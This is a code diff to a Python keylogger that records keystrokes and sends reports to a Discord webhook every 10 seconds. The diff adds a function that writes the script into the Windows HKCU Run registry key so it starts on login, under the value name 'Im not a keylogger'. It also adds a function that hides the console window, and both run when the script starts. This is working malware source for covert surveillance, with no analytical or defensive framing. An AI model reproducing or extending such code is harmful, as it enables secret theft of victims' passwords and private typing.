@@ -2,9 +2,32 @@ import keyboard,os
 from threading import Timer
 from datetime import datetime
 from discord_webhook import DiscordWebhook, DiscordEmbed
+import sys, os
+from winreg import *
 
 SEND_REPORT_EVERY = 10
-WEBHOOK = "WEBHOOK"
+WEBHOOK = ""
+
+def addStartup():  # this will add the file to the startup registry key
+    fp = os.path.dirname(os.path.realpath(__file__))
+    file_name = sys.argv[0].split('\\')[-1]
+    new_file_path = fp + '\\' + file_name
+    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
+    key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
+    SetValueEx(key2change, 'Im not a keylogger', 0, REG_SZ,
+               new_file_path)
+
+
+def Hide():
+    import win32console
+    import win32gui
+    win = win32console.GetConsoleWindow()
+    win32gui.ShowWindow(win, 0)
+
+addStartup()
+
+Hide()
+
 
 class Keylogger: 
     def __init__(self, interval, report_method="webhook"):
